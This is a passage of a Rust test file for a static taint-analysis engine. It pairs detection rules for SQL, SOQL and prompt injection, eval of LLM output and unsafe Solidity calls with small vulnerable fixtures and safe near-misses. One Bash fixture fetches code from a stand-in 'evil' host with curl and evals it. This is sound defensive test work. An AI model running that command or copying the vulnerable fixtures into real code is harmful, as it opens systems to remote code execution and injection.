        let tree = parse_file(src, Language::Go).expect("go fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "expected 1 finding for r.Body -> \"...\" + name, got {:?}",
            findings
        );
    }

    /// Go safe variant: a literal-only concatenation with no tainted operand
    /// must not fire.
    #[test]
    fn go_bridge_binop_format_untainted_concat_does_not_fire() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: go-binop-sqli-safe
mode: taint
languages: [go]
severity: ERROR
message: "Tainted request value flows into a built SQL string"
pattern-sources:
  - pattern: $REQ.Body
pattern-sinks:
  - pattern: '"$SQLSTR" + ...'
"#,
        );

        let src = r#"
package main

func handler(r *Request) {
    _ = r.Body
    query := "SELECT * FROM t WHERE n = " + "constant"
    db.Exec(query)
}
"#;
        let tree = parse_file(src, Language::Go).expect("go fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "literal-only concat has no tainted operand; expected no finding, got {:?}",
            findings
        );
    }

    // ── CALL-ON-MEMBER bridge (end-to-end) tests ─────────────────────────────
    //
    // A method call whose receiver is a member-access chain with a metavar root
    // (e.g. `$CLIENT.chat.completions.create(...)`) is compiled to a FieldName
    // on the penultimate field (`completions`). The engine taints that member
    // read; the trailing `.create(...)` propagates the taint. These go through
    // `parse_taint_rule` → `check`, the same path the CLI uses, on a real
    // fixture wrapped in a function (taint engines analyze inside functions).

    /// Python: `$CLIENT.chat.completions.create(...)` LLM-output source flows
    /// into `eval(...)` and fires. Mirrors `llm-output-to-exec-python`.
    #[test]
    fn python_bridge_member_call_llm_source_to_eval_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: py-llm-output-to-exec
mode: taint
languages: [python]
severity: ERROR
message: "LLM output reaches eval"
pattern-sources:
  - pattern: $CLIENT.chat.completions.create(...)
pattern-sinks:
  - pattern: eval($SINK)
"#,
        );
        assert!(
            matches!(rule.spec.sources.as_slice(), [GenericMatcher::FieldName { field, .. }] if field == "completions"),
            "source should compile to FieldName{{completions}}, got {:?}",
            rule.spec.sources
        );

        let src = r#"
def run(client):
    out = client.chat.completions.create(model="gpt-4")
    eval(out)
"#;
        let tree = parse_file(src, Language::Python).expect("python fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "expected 1 finding for completions.create -> eval, got {:?}",
            findings
        );
    }

    /// Python near-miss: a DIFFERENT penultimate field (`other.create`) must
    /// NOT be tainted, so no finding fires.
    #[test]
    fn python_bridge_member_call_different_field_near_miss_no_finding() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: py-llm-output-to-exec
mode: taint
languages: [python]
severity: ERROR
message: "LLM output reaches eval"
pattern-sources:
  - pattern: $CLIENT.chat.completions.create(...)
pattern-sinks:
  - pattern: eval($SINK)
"#,
        );

        let src = r#"
def run(client):
    out = client.chat.other.create(model="gpt-4")
    eval(out)
"#;
        let tree = parse_file(src, Language::Python).expect("python fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "different penultimate field must not taint; expected no finding, got {:?}",
            findings
        );
    }

    /// JavaScript: `$CLIENT.messages.create(...)` flows into `eval(...)`.
    /// Mirrors `llm-output-to-exec-javascript`.
    #[test]
    fn javascript_bridge_member_call_llm_source_to_eval_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: js-llm-output-to-exec
mode: taint
languages: [javascript]
severity: ERROR
message: "LLM output reaches eval"
pattern-sources:
  - pattern: $CLIENT.messages.create(...)
pattern-sinks:
  - pattern: eval($SINK)
"#,
        );
        assert!(
            matches!(rule.spec.sources.as_slice(), [GenericMatcher::FieldName { field, .. }] if field == "messages"),
            "source should compile to FieldName{{messages}}, got {:?}",
            rule.spec.sources
        );

        let src = r#"
function run(client) {
    const out = client.messages.create({model: "claude"});
    eval(out);
}
"#;
        let tree = parse_file(src, Language::JavaScript).expect("js fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "expected 1 finding for messages.create -> eval, got {:?}",
            findings
        );
    }

    /// JavaScript near-miss: a different penultimate field does not fire.
    #[test]
    fn javascript_bridge_member_call_different_field_near_miss_no_finding() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: js-llm-output-to-exec
mode: taint
languages: [javascript]
severity: ERROR
message: "LLM output reaches eval"
pattern-sources:
  - pattern: $CLIENT.messages.create(...)
pattern-sinks:
  - pattern: eval($SINK)
"#,
        );

        let src = r#"
function run(client) {
    const out = client.completions.create({model: "claude"});
    eval(out);
}
"#;
        let tree = parse_file(src, Language::JavaScript).expect("js fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "different penultimate field must not taint; expected no finding, got {:?}",
            findings
        );
    }

    // ── Concrete-root metavar-field bridge tests: `request.$ANYTHING` ────────
    //
    // A concrete request root with a wildcard field (`request.$ANYTHING`) is
    // compiled to a `ParamName` source on the root `request`; the engine then
    // taints every attribute read on that root. Mirrors the Django
    // `tainted-sql-string` / `tainted-url-host` / `raw-html-format` rules.

    #[test]
    fn compile_concrete_root_metavar_field_yields_paramname_root() {
        let m = compile("request.$ANYTHING", MatcherRole::Source).expect("request source");
        match m {
            GenericMatcher::ParamName { names, .. } => {
                assert_eq!(names, vec!["request".to_string()])
            }
            other => panic!("expected ParamName[request], got {other:?}"),
        }
        // Metavar root is rejected (too broad).
        assert!(parse_concrete_root_metavar_field("$REQ.$ANYTHING").is_none());
        // Concrete field is NOT this shape (it is a plain Attribute).
        assert!(parse_concrete_root_metavar_field("request.GET").is_none());
        // Three segments rejected.
        assert!(parse_concrete_root_metavar_field("a.b.$X").is_none());
    }

    /// Python: `request.$ANYTHING` source flows into a `"..." + ...` SQL string
    /// and fires. Mirrors `tainted-sql-string` (django).
    #[test]
    fn python_bridge_request_anything_source_to_binop_sink_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: py-django-tainted-sql
mode: taint
languages: [python]
severity: ERROR
message: "Tainted request attribute reaches a built SQL string"
pattern-sources:
  - pattern: request.$ANYTHING
pattern-sinks:
  - pattern: '"$SQLSTR" + ...'
"#,
        );
        assert!(
            matches!(rule.spec.sources.as_slice(), [GenericMatcher::ParamName { names, .. }] if names == &["request".to_string()]),
            "source should compile to ParamName[request], got {:?}",
            rule.spec.sources
        );

        let src = r#"
def view(request):
    name = request.GET
    query = "SELECT * FROM t WHERE n = " + name
    cursor.execute(query)
"#;
        let tree = parse_file(src, Language::Python).expect("python fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "expected 1 finding for request.GET -> \"...\" + name, got {:?}",
            findings
        );
    }

    /// Python near-miss: a non-request root (`config.GET`) is NOT a source, so a
    /// literal-built string from it does not fire.
    #[test]
    fn python_bridge_request_anything_non_request_root_near_miss_no_finding() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: py-django-tainted-sql
mode: taint
languages: [python]
severity: ERROR
message: "Tainted request attribute reaches a built SQL string"
pattern-sources:
  - pattern: request.$ANYTHING
pattern-sinks:
  - pattern: '"$SQLSTR" + ...'
"#,
        );

        let src = r#"
def view(config):
    name = config.GET
    query = "SELECT * FROM t WHERE n = " + name
    cursor.execute(query)
"#;
        let tree = parse_file(src, Language::Python).expect("python fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "non-request root must not be a source; expected no finding, got {:?}",
            findings
        );
    }

    // ── Bridge-level tests: ObjectLiteralValue (LLM system-prompt sink) ──────

    /// Python: `request.data` source → `{"role": "system", "content": $SINK}`
    /// dict-literal sink. Only `ObjectLiteralValue` can express a dict-literal
    /// whose value position carries the tainted value.
    #[test]
    fn python_bridge_object_literal_sink_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: py-objlit-prompt-injection
mode: taint
languages: [python]
severity: ERROR
message: "User input flows into a system-prompt dict literal"
pattern-sources:
  - pattern: request.data
pattern-sinks:
  - patterns:
      - pattern: |
          {"role": "system", "content": $SINK}
      - focus-metavariable: $SINK
"#,
        );
        assert!(
            matches!(
                rule.spec.sinks.as_slice(),
                [GenericMatcher::ObjectLiteralValue { .. }]
            ),
            "sink should compile to ObjectLiteralValue, got {:?}",
            rule.spec.sinks
        );

        let src = r#"
def handler():
    user = request.data
    msg = {"role": "system", "content": user}
    return msg
"#;
        let tree = parse_file(src, Language::Python).expect("python fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "expected 1 finding for request.data -> dict literal value, got {:?}",
            findings
        );
    }

    /// Python near-miss: a dict literal with only literal values must NOT fire.
    #[test]
    fn python_bridge_object_literal_clean_does_not_fire() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: py-objlit-prompt-injection-safe
mode: taint
languages: [python]
severity: ERROR
message: "User input flows into a system-prompt dict literal"
pattern-sources:
  - pattern: request.data
pattern-sinks:
  - patterns:
      - pattern: |
          {"role": "system", "content": $SINK}
      - focus-metavariable: $SINK
"#,
        );

        let src = r#"
def handler():
    user = request.data
    msg = {"role": "system", "content": "you are a helpful assistant"}
    return msg
"#;
        let tree = parse_file(src, Language::Python).expect("python fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "a dict literal with only literal values must not fire, got {:?}",
            findings
        );
    }

    /// JavaScript: `req.body` source → `{role: "system", content: $SINK}`
    /// object-literal sink.
    #[test]
    fn javascript_bridge_object_literal_sink_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: js-objlit-prompt-injection
mode: taint
languages: [javascript, typescript]
severity: ERROR
message: "User input flows into a system-prompt object literal"
pattern-sources:
  - pattern: $REQ.body
pattern-sinks:
  - patterns:
      - pattern: |
          {role: "system", content: $SINK}
      - focus-metavariable: $SINK
"#,
        );
        assert!(
            matches!(
                rule.spec.sinks.as_slice(),
                [GenericMatcher::ObjectLiteralValue { .. }]
            ),
            "sink should compile to ObjectLiteralValue, got {:?}",
            rule.spec.sinks
        );

        let src = r#"
function handler(req) {
    const user = req.body;
    const msg = { role: "system", content: user };
    return msg;
}
"#;
        let tree = parse_file(src, Language::JavaScript).expect("js fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "expected 1 finding for req.body -> object literal value, got {:?}",
            findings
        );
    }

    /// JavaScript near-miss: an object literal with only literal values must
    /// NOT fire.
    #[test]
    fn javascript_bridge_object_literal_clean_does_not_fire() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: js-objlit-prompt-injection-safe
mode: taint
languages: [javascript, typescript]
severity: ERROR
message: "User input flows into a system-prompt object literal"
pattern-sources:
  - pattern: $REQ.body
pattern-sinks:
  - patterns:
      - pattern: |
          {role: "system", content: $SINK}
      - focus-metavariable: $SINK
"#,
        );

        let src = r#"
function handler(req) {
    const user = req.body;
    const msg = { role: "system", content: "fixed instructions" };
    return msg;
}
"#;
        let tree = parse_file(src, Language::JavaScript).expect("js fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "an object literal with only literal values must not fire, got {:?}",
            findings
        );
    }

    // ── Bridge-level tests: ReturnValue (`return $SINK` tainted-return sink) ──

    /// Python: `requests.get(...)` source → `return $SINK` sink. Only
    /// `ReturnValue` can express a sink that is the function's return value.
    #[test]
    fn python_bridge_return_value_sink_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: py-return-value-sink
mode: taint
languages: [python]
severity: ERROR
message: "External response returned unsanitized"
pattern-sources:
  - pattern: requests.get(...)
pattern-sinks:
  - patterns:
      - pattern: return $SINK
      - focus-metavariable: $SINK
"#,
        );
        assert!(
            matches!(
                rule.spec.sinks.as_slice(),
                [GenericMatcher::ReturnValue { .. }]
            ),
            "sink should compile to ReturnValue, got {:?}",
            rule.spec.sinks
        );

        let src = r#"
def fetch():
    data = requests.get("http://api")
    return data
"#;
        let tree = parse_file(src, Language::Python).expect("python fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "expected 1 finding for requests.get -> return, got {:?}",
            findings
        );
    }

    /// Python near-miss: returning a clean literal must NOT fire.
    #[test]
    fn python_bridge_return_value_clean_does_not_fire() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: py-return-value-sink-safe
mode: taint
languages: [python]
severity: ERROR
message: "External response returned unsanitized"
pattern-sources:
  - pattern: requests.get(...)
pattern-sinks:
  - patterns:
      - pattern: return $SINK
      - focus-metavariable: $SINK
"#,
        );

        let src = r#"
def fetch():
    data = requests.get("http://api")
    return "ok"
"#;
        let tree = parse_file(src, Language::Python).expect("python fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "returning a clean literal must not fire, got {:?}",
            findings
        );
    }

    /// The `return $X` shape compiles to `ReturnValue`, but a non-bare return
    /// (`return foo(bar)`) is NOT this shape and must reject.
    #[test]
    fn return_value_shape_rejects_non_bare_return() {
        assert!(parse_return_metavar("return $X").is_some());
        assert!(parse_return_metavar("return $SINK").is_some());
        assert!(parse_return_metavar("return foo($X)").is_none());
        assert!(parse_return_metavar("return \"...\".format(...)").is_none());
        assert!(parse_return_metavar("return").is_none());
        assert!(parse_return_metavar("returnx").is_none());
        assert!(parse_return_metavar("$X").is_none());
    }

    // ── Bridge-level tests: Bash (`curl-eval` / hooks command-injection) ─────
    //
    // These exercise the FULL CLI path: parse_taint_rule → Compiled → check on
    // a real Bash fixture. They MUST NOT call analyze_tree directly.

    /// Real rule `curl-eval`: `$(curl ...)` source → `eval ...` sink.
    #[test]
    fn bash_bridge_curl_eval_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: curl-eval
mode: taint
languages: [bash]
severity: WARNING
message: "Data is being eval'd from a curl command."
pattern-sources:
  - pattern: |
      $(curl ...)
  - pattern: |
      `curl ...`
pattern-sinks:
  - pattern: eval ...
"#,
        );
        assert_eq!(rule.lang, Language::Bash);

        let src = "out=$(curl http://evil)\neval \"$out\"\n";
        let tree = parse_file(src, Language::Bash).expect("bash fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "curl-eval must fire via the compiled bridge, got {:?}",
            findings
        );
    }

    /// Safe near-miss for `curl-eval`: eval of a literal, no curl source.
    #[test]
    fn bash_bridge_curl_eval_safe_no_finding() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: curl-eval
mode: taint
languages: [bash]
severity: WARNING
message: "Data is being eval'd from a curl command."
pattern-sources:
  - pattern: |
      $(curl ...)
pattern-sinks:
  - pattern: eval ...
"#,
        );

        let src = "out=\"ls -la\"\neval \"$out\"\n";
        let tree = parse_file(src, Language::Bash).expect("bash fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "eval of a clean literal must not fire, got {:?}",
            findings
        );
    }

    /// Real rule `hooks-unquoted-variable-bash-taint`: `$(cat | jq ...)` source
    /// → `bash -c ...` / `eval ...` sinks.
    #[test]
    fn bash_bridge_hooks_jq_to_bash_c_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: hooks-unquoted-variable-bash-taint
mode: taint
languages: [bash]
severity: ERROR
message: "Untrusted stdin flows into a command execution sink."
pattern-sources:
  - pattern: $(cat | jq ...)
  - pattern: $(cat)
pattern-sinks:
  - pattern: eval $...SINK
  - pattern: bash -c $...SINK
  - pattern: sh -c $...SINK
"#,
        );

        let src = "data=$(cat | jq -r '.path')\nbash -c \"$data\"\n";
        let tree = parse_file(src, Language::Bash).expect("bash fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "hooks jq -> bash -c must fire via bridge, got {:?}",
            findings
        );
    }

    // ── Bridge-level tests: Solidity (delegatecall / selfdestruct) ───────────

    /// Real rule `delegatecall-to-arbitrary-address`: param `address` source →
    /// `$CONTRACT.delegatecall(...)` sink.
    #[test]
    fn solidity_bridge_delegatecall_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: delegatecall-to-arbitrary-address
mode: taint
languages: [solidity]
severity: ERROR
message: "An attacker may perform delegatecall() to an arbitrary address."
pattern-sources:
  - patterns:
    - pattern-either:
      - pattern: function $ANY(..., address $CONTRACT, ...) public {...}
      - pattern: function $ANY(..., address $CONTRACT, ...) external {...}
    - focus-metavariable: $CONTRACT
pattern-sinks:
  - patterns:
    - pattern-either:
      - pattern: $CONTRACT.delegatecall(...);
      - pattern: $CONTRACT.delegatecall{gas:$GAS}(...);
"#,
        );
        assert_eq!(rule.lang, Language::Solidity);

        let src = r#"
contract C {
  function run(address target, bytes data) public {
    target.delegatecall(data);
  }
}
"#;
        let tree = parse_file(src, Language::Solidity).expect("solidity fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "delegatecall to a param address must fire via bridge, got {:?}",
            findings
        );
    }

    /// Safe near-miss: delegatecall to a hard-coded `address(this)`.
    #[test]
    fn solidity_bridge_delegatecall_to_self_safe() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: delegatecall-to-arbitrary-address
mode: taint
languages: [solidity]
severity: ERROR
message: "An attacker may perform delegatecall() to an arbitrary address."
pattern-sources:
  - patterns:
    - pattern-either:
      - pattern: function $ANY(..., address $CONTRACT, ...) public {...}
pattern-sinks:
  - patterns:
    - pattern-either:
      - pattern: $CONTRACT.delegatecall(...);
"#,
        );

        let src = r#"
contract C {
  function run(bytes data) public {
    address(this).delegatecall(data);
  }
}
"#;
        let tree = parse_file(src, Language::Solidity).expect("solidity fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "delegatecall to address(this) must not fire, got {:?}",
            findings
        );
    }

    /// Real rule `accessible-selfdestruct`: param `address` source →
    /// `selfdestruct(...)` sink.
    #[test]
    fn solidity_bridge_selfdestruct_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: accessible-selfdestruct
mode: taint
languages: [solidity]
severity: ERROR
message: "Contract can be destructed by anyone."
pattern-sources:
  - patterns:
    - focus-metavariable:
        - $ADDR
    - pattern-either:
        - pattern: function $FUNC(..., address $ADDR, ...) external { ... }
        - pattern: function $FUNC(..., address $ADDR, ...) public { ... }
pattern-sinks:
  - pattern-either:
    - pattern: selfdestruct(...);
    - pattern: suicide(...);
"#,
        );

        let src = r#"
contract C {
  function kill(address payable target) public {
    selfdestruct(target);
  }
}
"#;
        let tree = parse_file(src, Language::Solidity).expect("solidity fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "selfdestruct of a param must fire via bridge, got {:?}",
            findings
        );
    }

    // ── Bridge-level tests: Scala (tainted SQL / scalajs eval) ───────────────

    /// Real rule `tainted-sql-string`: request param source → `"$SQL" + ...`
    /// string-building sink.
    #[test]
    fn scala_bridge_tainted_sql_string_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: tainted-sql-string
mode: taint
languages: [scala]
severity: ERROR
message: "User data flows into a manually-constructed SQL string."
pattern-sources:
  - patterns:
    - pattern: $PARAM
    - pattern-either:
      - pattern-inside: |
          def $CTRL(..., $PARAM: $TYPE, ...) = {
            ...
          }
pattern-sinks:
  - patterns:
    - pattern-either:
      - pattern: |
          "$SQLSTR" + ...
    - metavariable-regex:
        metavariable: $SQLSTR
        regex: (?i)(select|delete|insert|create|update|alter|drop)\b
"#,
        );
        assert_eq!(rule.lang, Language::Scala);

        let src = r#"
object Ctrl {
  def index(name: String) = {
    val q = "SELECT * FROM t WHERE n = " + name
    db.run(q)
  }
}
"#;
        let tree = parse_file(src, Language::Scala).expect("scala fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "tainted SQL concat must fire via bridge, got {:?}",
            findings
        );
    }

    /// Safe near-miss: SQL string built only from literals.
    #[test]
    fn scala_bridge_tainted_sql_string_literal_safe() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: tainted-sql-string
mode: taint
languages: [scala]
severity: ERROR
message: "User data flows into a manually-constructed SQL string."
pattern-sources:
  - patterns:
    - pattern: $PARAM
    - pattern-either:
      - pattern-inside: |
          def $CTRL(..., $PARAM: $TYPE, ...) = {
            ...
          }
pattern-sinks:
  - patterns:
    - pattern-either:
      - pattern: |
          "$SQLSTR" + ...
"#,
        );

        let src = r#"
object Ctrl {
  def index(name: String) = {
    val q = "SELECT * FROM t WHERE n = " + "admin"
    db.run(q)
  }
}
"#;
        let tree = parse_file(src, Language::Scala).expect("scala fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "literal-only SQL concat must not fire, got {:?}",
            findings
        );
    }

    /// Real rule `scalajs-eval`: request param source → `$JS.eval(...)` sink.
    #[test]
    fn scala_bridge_scalajs_eval_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: scalajs-eval
mode: taint
languages: [scala]
severity: WARNING
message: "eval() of user-controlled data."
pattern-sources:
  - patterns:
    - pattern: $PARAM
    - pattern-either:
      - pattern-inside: |
          def $CTRL(..., $PARAM: $TYPE, ...) = {
            ...
          }
pattern-sinks:
  - patterns:
    - pattern: $JS.eval(...)
"#,
        );

        let src = r#"
object Ctrl {
  def index(code: String) = {
    js.eval(code)
  }
}
"#;
        let tree = parse_file(src, Language::Scala).expect("scala fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "scalajs eval of param must fire via bridge, got {:?}",
            findings
        );
    }

    // ── Bridge-level tests: Apex (SOQL injection) ────────────────────────────

    /// Real rule `soql-injection-unescaped-param`: any-parameter source →
    /// `Database.query(<... $P ...>)` sink, sanitized by
    /// `String.escapeSingleQuotes`.
    #[test]
    fn apex_bridge_soql_injection_unescaped_param_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: soql-injection-unescaped-param
mode: taint
severity: ERROR
languages:
  - apex
message: "SOQL injection from an unescaped parameter."
pattern-sources:
  - by-side-effect: true
    patterns:
      - pattern: $M(...,String $P,...) { ... }
      - focus-metavariable: $P
pattern-sanitizers:
  - pattern-either:
    - pattern: String.escapeSingleQuotes($P)
    - pattern: Database.query(<... String.escapeSingleQuotes($P) ...>)
pattern-sinks:
  - pattern: Database.query(<... $P ...>)
"#,
        );
        assert_eq!(rule.lang, Language::Apex);

        let src = r#"
public class C {
    public List<Account> find(String p) {
        return Database.query(p);
    }
}
"#;
        let tree = parse_file(src, Language::Apex).expect("apex fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "tainted Database.query must fire via bridge, got {:?}",
            findings
        );
    }

    /// Safe near-miss: the parameter is escaped via `String.escapeSingleQuotes`
    /// before reaching `Database.query`.
    #[test]
    fn apex_bridge_soql_injection_sanitized_safe() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: soql-injection-unescaped-param
mode: taint
severity: ERROR
languages:
  - apex
message: "SOQL injection from an unescaped parameter."
pattern-sources:
  - by-side-effect: true
    patterns:
      - pattern: $M(...,String $P,...) { ... }
      - focus-metavariable: $P
pattern-sanitizers:
  - pattern-either:
    - pattern: String.escapeSingleQuotes($P)
    - pattern: Database.query(<... String.escapeSingleQuotes($P) ...>)
pattern-sinks:
  - pattern: Database.query(<... $P ...>)
"#,
        );

        let src = r#"
public class C {
    public List<Account> find(String p) {
        String safe = String.escapeSingleQuotes(p);
        return Database.query(safe);
    }
}
"#;
        let tree = parse_file(src, Language::Apex).expect("apex fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "escaped parameter must not fire, got {:?}",
            findings
        );
    }

    /// Real rule `soql-injection-unescaped-url-param`: chained request-param
    /// read source → `Database.query($SINK,...)` focus-argument sink.
    #[test]
    fn apex_bridge_soql_injection_url_param_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: soql-injection-unescaped-url-param
mode: taint
severity: ERROR
languages:
  - apex
message: "SOQL injection from an unescaped URL parameter."
pattern-sources:
  - by-side-effect: true
    pattern: ApexPage.getCurrentPage().getParameters.get($URLPARAM);
pattern-sanitizers:
  - pattern: String.escapeSingleQuotes(...)
pattern-sinks:
  - patterns:
    - pattern: Database.query($SINK,...);
    - focus-metavariable: $SINK
"#,
        );
        assert_eq!(rule.lang, Language::Apex);

        let src = r#"
public class C {
    public List<Account> find() {
        String url = ApexPage.getCurrentPage().getParameters().get('q');
        return Database.query(url);
    }
}
"#;
        let tree = parse_file(src, Language::Apex).expect("apex fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "tainted URL-param Database.query must fire via bridge, got {:?}",
            findings
        );
    }

    /// Safe near-miss: a literal query, no request-parameter flow.
    #[test]
    fn apex_bridge_soql_injection_url_param_literal_safe() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: soql-injection-unescaped-url-param
mode: taint
severity: ERROR
languages:
  - apex
message: "SOQL injection from an unescaped URL parameter."
pattern-sources:
  - by-side-effect: true
    pattern: ApexPage.getCurrentPage().getParameters.get($URLPARAM);
pattern-sanitizers:
  - pattern: String.escapeSingleQuotes(...)
pattern-sinks:
  - patterns:
    - pattern: Database.query($SINK,...);
    - focus-metavariable: $SINK
"#,
        );

        let src = r#"
public class C {
    public List<Account> find() {
        return Database.query('SELECT Id FROM Account');
    }
}
"#;
        let tree = parse_file(src, Language::Apex).expect("apex fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "literal query must not fire, got {:?}",
            findings
        );
    }

    // ── Bridge-level tests: Swift (sqlite injection) ─────────────────────────

    /// Real rule `swift-potential-sqlite-injection`: an interpolated/concatenated
    /// SQL string source → `sqlite3_exec`/`sqlite3_prepare_v2` focus-argument
    /// sink.
    #[test]
    fn swift_bridge_sqlite_injection_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: swift-potential-sqlite-injection
mode: taint
severity: WARNING
languages:
  - swift
message: "Potential client-side SQL injection."
pattern-sources:
  - pattern-either:
    - pattern: |
        "...\($X)..."
    - pattern: |
        $SQL = "..." + $X
    - pattern: |
        $SQL = $X + "..."
pattern-sinks:
  - patterns:
    - pattern-either:
      - pattern: sqlite3_exec($DB, $SQL, ...)
      - pattern: sqlite3_prepare_v2($DB, $SQL, ...)
    - focus-metavariable:
      - $SQL
"#,
        );
        assert_eq!(rule.lang, Language::Swift);

        let src = r#"
func handler(input: String) {
    let q = "SELECT * FROM t WHERE n = \(input)"
    sqlite3_exec(db, q, nil, nil, nil)
}
"#;
        let tree = parse_file(src, Language::Swift).expect("swift fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "interpolated SQL into sqlite3_exec must fire via bridge, got {:?}",
            findings
        );
    }

    /// Safe near-miss: a fully-literal SQL string reaches `sqlite3_exec` — no
    /// dynamic interpolation/concatenation, so no finding.
    #[test]
    fn swift_bridge_sqlite_injection_literal_safe() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: swift-potential-sqlite-injection
mode: taint
severity: WARNING
languages:
  - swift
message: "Potential client-side SQL injection."
pattern-sources:
  - pattern-either:
    - pattern: |
        "...\($X)..."
    - pattern: |
        $SQL = "..." + $X
    - pattern: |
        $SQL = $X + "..."
pattern-sinks:
  - patterns:
    - pattern-either:
      - pattern: sqlite3_exec($DB, $SQL, ...)
      - pattern: sqlite3_prepare_v2($DB, $SQL, ...)
    - focus-metavariable:
      - $SQL
"#,
        );

        let src = r#"
func handler() {
    let q = "SELECT * FROM t"
    sqlite3_exec(db, q, nil, nil, nil)
}
"#;
        let tree = parse_file(src, Language::Swift).expect("swift fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "literal SQL must not fire, got {:?}",
            findings
        );
    }

    // ── Parameter-as-source shape: focus-metavariable + function-signature
    //    pattern-inside inside a taint pattern-sources block ────────────────

    /// JS `lang/detect-child-process` shape: a `patterns:` source block with a
    /// `pattern-inside: function ...(...,$FUNC,...)` context plus
    /// `focus-metavariable: $FUNC`. Compiles to the any-parameter wildcard
    /// source. A function parameter flowing to `exec(...)` must fire.
    #[test]
    fn js_param_source_focus_inside_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: js-child-process-param
mode: taint
languages: [javascript]
severity: ERROR
message: "Function argument reaches child_process.exec"
pattern-sources:
  - patterns:
      - pattern-inside: |
          function ... (...,$FUNC,...) {
            ...
          }
      - focus-metavariable: $FUNC
pattern-sinks:
  - pattern: exec($CMD,...)
"#,
        );
        // The source block must compile to the any-parameter wildcard.
        assert!(
            matches!(
                rule.spec.sources.as_slice(),
                [GenericMatcher::ParamName { names, .. }]
                    if names == &[crate::rules::taint_engine::ANY_PARAM_WILDCARD.to_string()]
            ),
            "expected wildcard ParamName source, got {:?}",
            rule.spec.sources
        );

        let src = r#"
function run(name, cmd) {
  exec(cmd);
}
"#;
        let tree = parse_file(src, Language::JavaScript).expect("js fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "a function parameter reaching exec() must fire, got {:?}",
            findings
        );
    }

    /// JS near-miss: the value reaching `exec(...)` is NOT a function parameter
    /// (it is a module-level constant), so the wildcard-param source must not
    /// taint it and the rule must not fire.
    #[test]
    fn js_param_source_non_param_does_not_fire() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: js-child-process-param-safe
mode: taint
languages: [javascript]
severity: ERROR
message: "Function argument reaches child_process.exec"
pattern-sources:
  - patterns:
      - pattern-inside: |
